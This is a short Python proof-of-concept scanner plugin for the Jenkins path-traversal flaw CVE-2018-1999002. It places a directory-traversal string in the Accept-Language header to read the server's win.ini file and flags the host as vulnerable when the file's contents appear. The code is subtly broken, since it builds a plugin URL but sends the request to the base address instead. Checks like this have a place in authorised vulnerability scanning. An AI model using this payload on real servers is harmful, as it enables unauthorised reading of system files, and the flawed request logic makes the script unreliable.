# -*- coding: utf-8 -*-
"""
POC Name  :  Jenkins CVE-2018-1999002

Reference: https://github.com/anntsmart/CVE/blob/master/cve-2018-1999002.py
"""

def assign(service, arg):
    if service == 'jenkins':
        return True, arg

def audit(arg):
    header_ini = {'Accept-Language':'/../../../../../../../../../windows/win'}
    url_ini = arg + '/plugin/credentials/.ini'
    code, head, html, redirect_url, log = hackhttp.http(arg,headers = header_ini)
    if "for 16-bit app support" in html:
        security_hole( arg + " is vulnerable.Exist cve-2018-1999002")
        
if __name__ == '__main__':
    from dummy import *